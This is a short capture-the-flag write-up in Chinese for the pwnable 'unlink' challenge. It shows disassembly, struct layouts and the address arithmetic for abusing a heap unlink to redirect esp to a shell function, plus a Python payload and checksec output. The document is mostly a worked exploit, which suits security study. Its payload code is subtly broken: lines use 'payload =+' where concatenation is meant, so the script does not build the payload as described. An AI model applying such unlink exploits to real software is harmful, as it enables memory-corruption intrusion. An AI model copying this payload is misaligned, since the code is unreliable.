# unlink

有給 stack and heap address

並且可以從A 蓋掉 B fd bk

- 080484eb <shell>


main 函數結尾異常






main
```
 80485f2:       e8 0d ff ff ff          call   8048504 <unlink>
 80485f7:       83 c4 10                add    esp,0x10
 80485fa:       b8 00 00 00 00          mov    eax,0x0
 80485ff:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
 8048602:       c9                      leave  ; mov esp ebp；pop ebp
 8048603:       8d 61 fc                lea    esp,[ecx-0x4]
 8048606:       c3                      ret    ; pop eip ,jmp eip
```



```
  char *A; // [esp+4h] [ebp-14h]  //stack leak
  _DWORD *C; // [esp+8h] [ebp-10h]
  _DWORD *B; // [esp+Ch] [ebp-Ch]
```

主要漏洞出在 unlink


把 shell 位置 寫入 heap_leak + 0xc 

我們要控制 esp = shell 地址 = [ecx - 0x4] = [heap_leak + 0xc] = 0x080484eb

ecx = heap_leak + 0x10

---

ebp = stack_leak + 0x14

ebp-0x4 = stack_leak + 0x14 - 0x4

---

ecx = heap_leak + 0x10 = [ebp-0x4] = [stack_leak - 0x10]

---

FD + 0x4 = stack_leak + 0x10

FD = stack_leak + 0xc

BK = heap_leak + 0x10 

```c
A{
    struct tagOBJ* fd; //heap_leak
    struct tagOBJ* bk; //heap_leak+4
    char buf[8];        // heap_leak+8

}

B{
    struct tagOBJ* fd;
    struct tagOBJ* bk;
    char buf[8];
}
```

```python
payload = b'AAAA'           # A+0x8
payload =+ p32(0x080484eb)  # A+0xc
payload =+ b'A'*8           # padding chunk header
payload =+ p32(stack_leak + 0xc) # B fd
payload =+ p32(heap_leak + 0x10) # B bk
```

```
void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        
        BK=P->bk; //B bk =  heap_leak + 0x10
        FD=P->fd; //B fd = stack_leak + 0xc

        FD->bk=BK; //write *(heap_leak +0x10 ) to (stack_leak+0xc)
        BK->fd=FD; 
}
```







```
unlink@pwnable:~$  checksec unlink
[*] '/home/unlink/unlink'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```